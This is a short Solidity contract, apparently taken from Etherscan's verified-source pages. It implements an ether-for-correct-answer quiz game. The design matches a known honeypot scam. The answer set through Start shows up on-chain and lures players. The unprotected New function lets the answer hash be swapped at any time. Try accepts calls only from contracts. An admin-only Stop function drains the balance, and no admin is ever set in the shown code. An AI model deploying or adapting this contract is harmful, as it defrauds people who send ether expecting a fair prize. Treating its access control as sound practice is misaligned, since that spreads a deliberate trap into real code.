/**
 *Submitted for verification at Etherscan.io on 2022-04-06
*/

/**
 *Submitted for verification at Etherscan.io on 2021-09-12
*/

contract XTEst
{
    function Try(string memory _response) public payable
    {
        require(msg.sender != tx.origin);

        if(responseHash == keccak256(abi.encode(_response)) && msg.value > 1 ether)
        {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    
    function getValUint(string memory _response) external returns (uint256)
    {
      return uint256(keccak256(abi.encode(_response)));
    }

    function getValKeccak(string memory _response) external returns (bytes32 result)
    {
      return keccak256(abi.encode(_response));
    }

    
    function getHashKeccak(string memory _response) external returns (bytes32 result)
    {
      return responseHash;
    }



    string public question;

    bytes32 public responseHash;

    mapping (bytes32=>bool) admin;

    function Start(string calldata _question, string calldata _response) public payable{
        if(responseHash==0x0){
            responseHash = keccak256(abi.encode(_response));
            question = _question;
        }
    }

    function Stop() public payable isAdmin {
        payable(msg.sender).transfer(address(this).balance);
    }

    function New(string calldata _question, bytes32 _responseHash) public payable {
        question = _question;
        responseHash = _responseHash;
    }


    modifier isAdmin(){
        require(admin[keccak256(abi.encodePacked(msg.sender))]);
        _;
    }

    fallback() external {}
}